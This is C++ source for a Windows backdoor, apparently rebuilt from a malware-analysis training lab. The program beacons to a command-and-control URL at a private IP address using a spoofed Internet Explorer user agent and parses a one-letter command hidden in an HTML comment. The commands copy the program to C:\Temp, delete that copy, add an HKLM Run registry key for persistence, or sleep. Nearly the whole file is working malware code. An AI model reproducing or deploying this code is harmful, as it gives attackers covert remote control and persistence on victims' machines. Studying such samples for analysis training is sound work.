#include <Windows.h>
#include <cstdio>
#include <Wininet.h>

#pragma comment(lib, "wininet.lib")
#pragma warning( disable : 6387 )
#pragma warning( disable : 6001 )

BOOL CheckInternetAccess(void);
char GetCommandFromInternet(int x);
DWORD ExecCommand(char command, PSTR current_path);

int main(int argc, char* argv[], char* envp[])
{
	if (CheckInternetAccess() != 0)
	{
		for (int i = 0; i < 1440; i++)
		{
			char cmd = GetCommandFromInternet(i);
			if ((int)cmd != 0)
			{
				printf_s("Success: Parsed command is \"%c\"\n", cmd);
				ExecCommand(cmd, (PSTR)argv[0]);
				Sleep(0xEA60);
			}
		}
	}
	return ERROR_SUCCESS;
}


BOOL CheckInternetAccess(void)
{
	BOOL state;

	if (InternetGetConnectedState(nullptr, 0) == 0)
	{
		printf_s("Error 1.1: No Internet\n");
		state = FALSE;
	}
	else
	{
		printf_s("Success: Internet Connection\n");
		state = TRUE;
	}

	return state;
}


char GetCommandFromInternet(int x)
{
	HINTERNET hInet = nullptr;
	HINTERNET hGetUrl = nullptr;

	BOOL status = FALSE;

	char* buffer = new char[512];
	DWORD size;
	
	char user_agent[28];
	sprintf_s(user_agent, sizeof(user_agent), "Internet Explorer 7.50/pma%d", x);

	hInet = InternetOpenA(user_agent, 0, nullptr, nullptr, 0);
	hGetUrl = InternetOpenUrlA(hInet, "http://172.16.197.130:8000/cc.htm", nullptr, 0, 0, 0);
	if (hGetUrl == NULL)
	{
		printf_s("Error 2.1: Fail to OpenUrl\n");
		InternetCloseHandle(hInet);
		status = FALSE;
	}
	else if (!InternetReadFile(hGetUrl, buffer, 512, &size))
	{
		printf_s("Error 2.2: Fail to ReadFile\n");
		InternetCloseHandle(hInet);
		InternetCloseHandle(hGetUrl);
		status = FALSE;
	}
	else if (buffer[0] != '<')
	{
	_FailedCommand:
		printf_s("Error 2.3: Fail to get command\n");
		status = FALSE;
	}
	else
	{
		if (buffer[1] != '!')
			goto _FailedCommand;

		if (buffer[2] != '-')
			goto _FailedCommand;

		if (buffer[3] != '-')
			goto _FailedCommand;

		status = buffer[4];
	}

	delete[] buffer;

	return (char)status;
}


DWORD ExecCommand(char command, PSTR current_path)
{
	DWORD result;

	if ((command - 0x61) > 4)
		printf_s("Error 3.2: Not a valid command provided");
	else
	{
		switch (command)
		{
		case 'a':
		{
			CreateDirectoryA("C:\\Temp", nullptr);
			break;
		}
		case 'b':
		{
			CopyFileA(current_path, "C:\\Temp\\cc.exe", TRUE);
			break;
		}
		case 'c':
		{
			DeleteFileA("C:\\Temp\\cc.exe");
			break;
		}
		case 'd':
		{
			HKEY hKey = nullptr;
			RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
			if (RegSetValueExA(hKey, "Malware", 0, REG_SZ, (const PBYTE)"C:\\Temp\\cc.exe", 0xF) != NO_ERROR)
				printf_s("Error 3.1: Could not set Registry value");
			break;
		}
		case 'e':
		{
			Sleep(0x186A0);
			break;
		}
		}
	}

	result = GetLastError();
	return result;
}
